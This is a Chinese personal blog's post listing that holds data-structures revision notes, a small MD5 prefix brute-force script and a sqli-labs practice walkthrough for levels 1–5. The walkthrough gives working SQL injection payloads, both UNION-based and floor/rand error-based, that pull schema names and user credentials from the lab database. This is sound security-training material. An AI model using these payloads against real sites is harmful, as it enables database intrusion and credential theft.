<li>不需要某条指令时，可以使用NOP设置为空指令。</li>
<li>栈窗口点击右键，选择addressing–&gt;relative to EBP,可以把地址调成相对于EBP</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/">数据结构复习总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>深度/高度:</strong>   最上面的是第一层【根节点】，最下面的是最后一层。</p>
<h2 id="树的存储结构表示【p105】"><a href="#树的存储结构表示【p105】" class="headerlink" title="树的存储结构表示【p105】"></a>树的存储结构表示【p105】</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p>数组第一个单位内储存数据，第二个单位内储存该结点<strong>双亲结点</strong>的数组下标。</p>
<h3 id="孩子表示法【邻接表法】"><a href="#孩子表示法【邻接表法】" class="headerlink" title="孩子表示法【邻接表法】"></a>孩子表示法【邻接表法】</h3><p>数组第一个单位内储存数据，第二个单位内是一个后继指针，指向它的一个孩子结点，这个孩子结点又指向下一个孩子节点。【也可以增加一个单位来指向该结点的双亲结点】</p>
<h3 id="孩子兄弟表示法【二叉树表示法】"><a href="#孩子兄弟表示法【二叉树表示法】" class="headerlink" title="孩子兄弟表示法【二叉树表示法】"></a>孩子兄弟表示法【二叉树表示法】</h3><p>每个结点是一个结构体，包括data，firstchild，rightchild三个成员。</p>
<p>firstchild指向该节点的第一个孩子，rightchild指向该节点的下一个兄弟。</p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ol>
<li><p>度为0的结点个数为n0，度为1的结点个数为n1，度为1的结点个数为n1。则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n0 &#x3D; n2 + 1     &#x2F;&#x2F;n&#x3D;n0+n1+n2;n&#x3D;side+1;side&#x3D;n1+2*n2;</span><br></pre></td></tr></table></figure>
</li>
<li><p>具有n个结点的完全二叉树的深度为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[lbn]+1</span><br></pre></td></tr></table></figure>
</li>
<li><p>对完全二叉树从根节点开始按顺序编号，如果某结点是i，其左孩子是2i，右孩子是2i+1</p>
</li>
</ol>
<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h4><p>空的位置数组元素为0，非空的里填数据。</p>
<p><strong>缺点：</strong>对于空元素比较多，比如单支树，会有很多内存浪费。</p>
<h4 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h4><p>每个结点设为一个结构体，设Lchild，Rchild，data，[parent]。</p>
<h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>先序遍历：根-左子树-右子树</p>
<p>中序遍历：左子树-根-右子树</p>
<p>后序遍历：左子树-右子树-根</p>
<p>按层遍历：借助队列完成遍历</p>
<h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>每个结点是一个结构体，包含Lch，LTag，data，RTag，Rch。</p>
<p>结点有左子树，则指向左子树，否则指向前驱节点。结点有右子树，则指向右子树，否则指向后继结点。</p>
<p>对于如何连接线索二叉树的前驱和后继结点，只需先写好<strong>中序遍历顺序</strong>即可。</p>
<h2 id="树、森林、二叉树的转化"><a href="#树、森林、二叉树的转化" class="headerlink" title="树、森林、二叉树的转化"></a>树、森林、二叉树的转化</h2><h3 id="森林转化为二叉树"><a href="#森林转化为二叉树" class="headerlink" title="森林转化为二叉树"></a>森林转化为二叉树</h3><ol>
<li>把森林里的每一棵树转化为二叉树【除了与第一个孩子的连线全部删掉，将兄弟之间连好】</li>
<li>依次把右边二叉树的<strong>根节点</strong>作为左边二叉树<strong>根节点的右孩子</strong>。</li>
</ol>
<h3 id="二叉树转化为树"><a href="#二叉树转化为树" class="headerlink" title="二叉树转化为树"></a>二叉树转化为树</h3><ol>
<li>加线。如果某个结点有左孩子，则将该结点与该节点的左孩子的右孩子、右孩子的右孩子……连线。</li>
<li>去线。删除原二叉树里所有结点与其右孩子的连线。</li>
</ol>
<h3 id="二叉树转化为森林"><a href="#二叉树转化为森林" class="headerlink" title="二叉树转化为森林"></a>二叉树转化为森林</h3><p>先判断能不能转化为森林：【根节点有没有右孩子，有则可以】</p>
<ol>
<li>如果根节点有右孩子，删除与右孩子连线。接着判断该右孩子有没有右孩子，若有，重复上述操作。</li>
<li>将分开的几棵二叉树转化为树</li>
</ol>
<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>WPL = 所有叶子结点，每个叶子结点，用其权值*到其的线的个数。</p>
<h3 id="哈夫曼树的创建"><a href="#哈夫曼树的创建" class="headerlink" title="哈夫曼树的创建"></a>哈夫曼树的创建</h3><h3 id="哈夫曼树的编码"><a href="#哈夫曼树的编码" class="headerlink" title="哈夫曼树的编码"></a>哈夫曼树的编码</h3><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ol>
<li>图常表示为G(V,E)，G表示一个图，V是图中顶点的集合，E是图中连线的集合。</li>
<li>如果两顶点之间的连线没有方向，则称这条连线为<strong>边</strong>。如果两顶点之间的连线有方向，则称这条连线为<strong>弧</strong>。箭头出发点叫<strong>弧尾</strong>，箭头指向的叫<strong>弧头</strong>。</li>
<li><strong>强连通图</strong>：对有向图中的任意两个顶点vi，vj，均有能从vi到vj和从vj到vi。</li>
</ol>
<h2 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h2><h3 id="邻接矩阵表示法"><a href="#邻接矩阵表示法" class="headerlink" title="邻接矩阵表示法"></a>邻接矩阵表示法</h3><h3 id="邻接表-逆连接表表示法"><a href="#邻接表-逆连接表表示法" class="headerlink" title="邻接表/逆连接表表示法"></a>邻接表/逆连接表表示法</h3><p>邻接表：获取出度容易，入度难。</p>
<p>逆邻接表：获取入度容易，出度难。</p>
<h3 id="十字链表表示法【p191】"><a href="#十字链表表示法【p191】" class="headerlink" title="十字链表表示法【p191】"></a>十字链表表示法【p191】</h3><p>（图）</p>
<p>十字链表的每一个结点代表一条弧。</p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><ol>
<li>深度优先遍历【无法遍历时返回<strong>最接近</strong>的一个可继续遍历的结点继续遍历】</li>
<li>广度优先遍历</li>
</ol>
<h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><h3 id="普里姆【Prim】算法"><a href="#普里姆【Prim】算法" class="headerlink" title="普里姆【Prim】算法"></a>普里姆【Prim】算法</h3><p>假设未经历过的点为白色，经历过的点为灰色。</p>
<p>先将出发点变灰，查看由灰色的点出发所能到达的白色点中权值最小的一个，将那个白色点标灰。</p>
<p>依次类推，直到遍历完所有的点。</p>
<h3 id="克鲁斯卡尔【Kruskal】算法"><a href="#克鲁斯卡尔【Kruskal】算法" class="headerlink" title="克鲁斯卡尔【Kruskal】算法"></a>克鲁斯卡尔【Kruskal】算法</h3><p>从全图中找到权值最小的那些点，如果连上这些边不会形成回路，则连上这条边。</p>
<p>重复以上操作，直到遍历完所有的点。</p>
<h2 id="有向无环图及其应用"><a href="#有向无环图及其应用" class="headerlink" title="有向无环图及其应用"></a>有向无环图及其应用</h2><h3 id="关键路径的计算"><a href="#关键路径的计算" class="headerlink" title="关键路径的计算"></a>关键路径的计算</h3><p>过去求最早用max，回来求最晚用min</p>
<h3 id="最短路径的计算"><a href="#最短路径的计算" class="headerlink" title="最短路径的计算"></a>最短路径的计算</h3><h4 id="迪杰斯特拉【Dijkstra】算法"><a href="#迪杰斯特拉【Dijkstra】算法" class="headerlink" title="迪杰斯特拉【Dijkstra】算法"></a>迪杰斯特拉【Dijkstra】算法</h4><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>ASL（Average Search Length）=YASL+NASL</p>
<h2 id="几种表的查找"><a href="#几种表的查找" class="headerlink" title="几种表的查找"></a>几种表的查找</h2><h3 id="顺序表的查找"><a href="#顺序表的查找" class="headerlink" title="顺序表的查找"></a>顺序表的查找</h3><p>YASL=(n+1)/2</p>
<h3 id="有序表的查找"><a href="#有序表的查找" class="headerlink" title="有序表的查找"></a>有序表的查找</h3><p>折半查找：ASL=YASL+NASL=lb(n+1) + [lbn]</p>
<p><strong>折半查找的时间复杂度：O（lbn）</strong></p>
<blockquote>
<p>不一定折半，可以通过计算D=（K-data[low]）/（data[high]-data[low]）</p>
<p>来确定几分查找，其中K是查找的值</p>
</blockquote>
<h3 id="索引表的查找"><a href="#索引表的查找" class="headerlink" title="索引表的查找"></a>索引表的查找</h3><ol>
<li>稠密索引</li>
<li>分块索引：块内无序，块间有序</li>
</ol>
<p>最好的时间复杂度：O(  2^(1/2)  )，即块数和块内元素个数相等时</p>
<h2 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h2><p>概念：左子树的值小于根的值，右子树的值大于根的值。</p>
<h2 id="平衡二叉树【AVL树】"><a href="#平衡二叉树【AVL树】" class="headerlink" title="平衡二叉树【AVL树】"></a>平衡二叉树【AVL树】</h2><p>概念：首先是一个二叉排序树，其次每一个结点的<strong>（左子树高度-右子树高度）</strong>的值只能为-1,0,1这三个值。</p>
<p><strong>查找、插入、删除时间复杂度：O(lbn)</strong></p>
<h2 id="哈希查找"><a href="#哈希查找" class="headerlink" title="哈希查找"></a>哈希查找</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol>
<li>直接定址法</li>
<li>数字分析法</li>
<li>折叠法</li>
<li>除留取余法</li>
</ol>
<h3 id="处理冲突的方法"><a href="#处理冲突的方法" class="headerlink" title="处理冲突的方法"></a>处理冲突的方法</h3><h4 id="开放定址法"><a href="#开放定址法" class="headerlink" title="开放定址法"></a>开放定址法</h4><ol>
<li>线性探测</li>
<li>二次探测</li>
<li>随机探测</li>
</ol>
<h4 id="再哈希法"><a href="#再哈希法" class="headerlink" title="再哈希法"></a>再哈希法</h4><h4 id="链地址法"><a href="#链地址法" class="headerlink" title="链地址法"></a>链地址法</h4><h4 id="公共溢出法"><a href="#公共溢出法" class="headerlink" title="公共溢出法"></a>公共溢出法</h4><h3 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h3><p>装填因子α=填入表的记录个数/哈希表长度</p>
<p>如果找到了好的装填因子，那么哈希查找的时间复杂度就是O(C)。</p>
<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><h2 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h3><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><h2 id="性能分析-1"><a href="#性能分析-1" class="headerlink" title="性能分析"></a>性能分析</h2><p><img src="/2020/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/1.jpg" alt="1"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/30/cve%E9%9B%86%E5%90%88/">cve集合</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-30</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/22/python%E5%AD%A6%E4%B9%A0/">python学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-22</time><div class="content"><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = [<span class="string">''</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">goal = <span class="string">'cba0c'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">			<span class="keyword">for</span> m <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">				<span class="keyword">for</span> n <span class="keyword">in</span> range(len(dic)):</span><br><span class="line">					whole = dic[i]+dic[j]+dic[k]+dic[m]+dic[n]</span><br><span class="line">					res = hashlib.md5(whole.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">					<span class="keyword">if</span>(res[<span class="number">0</span>:<span class="number">5</span>]==goal):</span><br><span class="line">						print(whole)</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/09/26/sql-labs/">sql-labs刷题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-26</time><div class="content"><h2 id="No-1【单引号字符型】"><a href="#No-1【单引号字符型】" class="headerlink" title="No.1【单引号字符型】"></a>No.1【单引号字符型】</h2><p>我们输入?id=2-1发现回显<strong>第二个</strong>数据</p>
<p>我们输入?id=1’发现回显错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1			&#x2F;&#x2F;最外面两个单引号相当于没有</span><br><span class="line">&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>可推断出后台的sql语句类似于<strong>字符型注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">SELECT * FROM xxx WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>字符型传入sql的代码类似于 SELECT * FROM xxx WHERE id=’2-1’ LIMIT 0,1，2-1会被当成字符来查询，从而取符号之前的2</p>
</blockquote>
<p>于是我们可以构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM xxx WHERE id&#x3D;&#39;$id&#39; order by n --+&#39; LIMIT 0,1</span><br><span class="line">即?id&#x3D;1&#39; order by n --+</span><br></pre></td></tr></table></figure>

<p>通过改变n的个数来确定字段的个数，因为order by n相当于以第n列为标准排序，当n大于字段个数时候，就会报错，类似于：</p>
<p><img src="/2020/09/26/sql-labs/1_1.png" alt="1_1"></p>
<p>接着利用这张表开始一步步爆破就好了</p>
<p><img src="/2020/09/26/sql-labs/1_2.png" alt="1_2"></p>
<p>首先爆出库名：[security]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,database(),3 --+		&#x2F;&#x2F;其中union后面的字段数要和之前的字段列数相等</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>

<p>接着爆出表名：【users】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>

<p>接着爆出列名：【id, username, password】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>

<p>最后爆出内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users--+</span><br></pre></td></tr></table></figure>

<p>就得到了：</p>
<p><img src="/2020/09/26/sql-labs/1_3.png" alt="1_3"></p>
<h2 id="No-2【数字型】"><a href="#No-2【数字型】" class="headerlink" title="No.2【数字型】"></a>No.2【数字型】</h2><p>输入?id=2-1,得到第一列的结果</p>
<blockquote>
<p>为什么不能用?id=1+1测试？</p>
<p>因为+在php里会被当成连接两个字符的连接符</p>
<p>测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">&lt;?php</span><br><span class="line">	$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">	$id&#x3D;&quot;id&#x3D;$id&quot;;</span><br><span class="line">	echo $id;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>?id=1+1得到</p>
<p><img src="/2020/09/26/sql-labs/2_1.png" alt="2_1"></p>
<p>?id=2-1得到</p>
<p><img src="/2020/09/26/sql-labs/2_2.png" alt="2_2"></p>
</blockquote>
<p>输入?id=1’，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>输入?id=1 –+，回显正常</p>
<p>推断后台代码为<strong>数字型</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">SELECT * FROM xxx WHERE id&#x3D;$id LIMIT 0,1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>数字型传入sql的代码类似于 SELECT * FROM xxx WHERE id=2-1 LIMIT 0,1，2-1会被当成数字1来查询</p>
</blockquote>
<p>于是接下来类似No.1这样注入就可以了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>



<blockquote>
<p>对于字符型和数字型，有如下测试</p>
<p><img src="/2020/09/26/sql-labs/2_3.png" alt="2_3"></p>
</blockquote>
<h2 id="No-3【-‘-id’-】"><a href="#No-3【-‘-id’-】" class="headerlink" title="No.3【 (‘$id’) 】"></a>No.3【 (‘$id’) 】</h2><p>输入?id=2-1回显第二列</p>
<p>输入?id=1’报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39;1&#39;&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>推断为字符型注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">SELECT * FROM xxx WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>



<p>于是输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) --+</span><br></pre></td></tr></table></figure>

<p>成功回显第一列</p>
<p>那么接下来就按照前两种方法注入就行了，类似于：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>





<h2 id="No-4【-“-id”-】"><a href="#No-4【-“-id”-】" class="headerlink" title="No.4【 (“$id”) 】"></a>No.4【 (“$id”) 】</h2><p>这题我先摆上源码吧，比较难顶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>输入?id=1”报错，类似于有一个双引号找不到匹配的双引号</p>
<p><img src="/2020/09/26/sql-labs/4_2.png" alt="4_2"></p>
<p>输入?id=1’不报错，类似于sql把双引号里的看作字符，那么1’就相当于1</p>
<p><img src="/2020/09/26/sql-labs/4_1.png" alt="4_1"></p>
<p>输入?id=1’)也不报错，类似于之前1’</p>
<p><img src="/2020/09/26/sql-labs/4_3.png" alt="4_3"></p>
<h3 id="发现1"><a href="#发现1" class="headerlink" title="发现1"></a>发现1</h3><blockquote>
<p>事实上，在(“1’)”)第一个右括号之后加任何奇怪的字符，都不会报错，因为’)之后的全部省略了</p>
<p><img src="/2020/09/26/sql-labs/4_4.png" alt="4_4"></p>
</blockquote>
<p>至于这道题的解法，那和之前类似，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>







<h2 id="No-5【报错型注入】"><a href="#No-5【报错型注入】" class="headerlink" title="No.5【报错型注入】"></a>No.5【报错型注入】</h2><p>输入?id=1发现不回显</p>
<p>输入?id=1’报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>是单引号字符注入，但是不回显就很难受</p>
<p>基本的注入点就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; --+</span><br></pre></td></tr></table></figure>



<h3 id="floor报错注入原理分析"><a href="#floor报错注入原理分析" class="headerlink" title="floor报错注入原理分析"></a>floor报错注入原理分析</h3><p>首先创建一张测试表</p>
<p><img src="/2020/09/26/sql-labs/5_1.png" alt="5_1"></p>
<p>然后我们以age为主键进行分类</p>
<p><img src="/2020/09/26/sql-labs/5_2.png" alt="5_2"></p>
<p>再创造一个能生成伪随机数的语句</p>
<p><img src="/2020/09/26/sql-labs/5_3.png" alt="5_3"></p>
<p>于是可以构造：</p>
<p><img src="/2020/09/26/sql-labs/5_4.png" alt="5_4"></p>
<p>发现报错爆出了数据表的名字，那么为什么会产生“ Duplicate entry ‘test1’ for key ‘<group_key>‘ ”的错误呢？</group_key></p>
<blockquote>
<p>group by的工作原理</p>
<ol>
<li><p>首先，创造一张空的表</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>扫描原始表，x进行了第一次运算，按照上上个图片知道x的结果是test0</p>
</li>
<li><p>在空表里进行查询，发现无test0字段，于是准备进行插入</p>
</li>
<li><p>插入时需要知道插入什么，于是x进行第二次运算，x=test1</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>test1</td>
</tr>
</tbody></table>
</li>
<li><p>继续扫描原始表，进行第三次运算，x=test1，而此时test1已经存在于是插入</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>test1</td>
</tr>
</tbody></table>
</li>
<li><p>继续扫描原始表，进行第四次运算，x=test0，这个最终表里没有，所以准备插入test0</p>
</li>
<li><p>插入时再次进行运算【第五次】，x=test1。可是发现test1已经存在于最终表里了，于是系统不晓得怎么办，即报错了。</p>
</li>
</ol>
</blockquote>
<p>知道了这些原理我们就可以开始sql注入了【还是要注意列数的相匹配，原来有三列，而计数只有count(*)和x两列，所以要加一列】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x --+</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x)a --+</span><br><span class="line">&#x2F;*没有这个a会报错“Every derived table must have its own alias”，大概意思就是from后面当成了一个表，而这个表如果不加a相当于没有名字*&#x2F;</span><br><span class="line">或者</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.schemata group by x --+</span><br></pre></td></tr></table></figure>

<p>但是第三种有个严重的问题就是group_concat只能读64个字符，不一定读的全：</p>
<p><img src="/2020/09/26/sql-labs/5_5.png" alt="5_5"></p>
<p>显然最后一个单词就没读全</p>
<p>我们想到可不可以去掉group_concat()呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select schema_name from information_schema.schemata),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/26/sql-labs/5_6.png" alt="5_6"></p>
<p>显然是不行的，那么我们可以使用limit 0,1来一个个输出这些数据，改变n的值一个个试试出库名【security】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat((select schema_name from information_schema.schemata limit n,1),floor(rand(0)*2))x from information_schema.schemata group by x  --+</span><br></pre></td></tr></table></figure>

<p>爆出表名【users】</p>
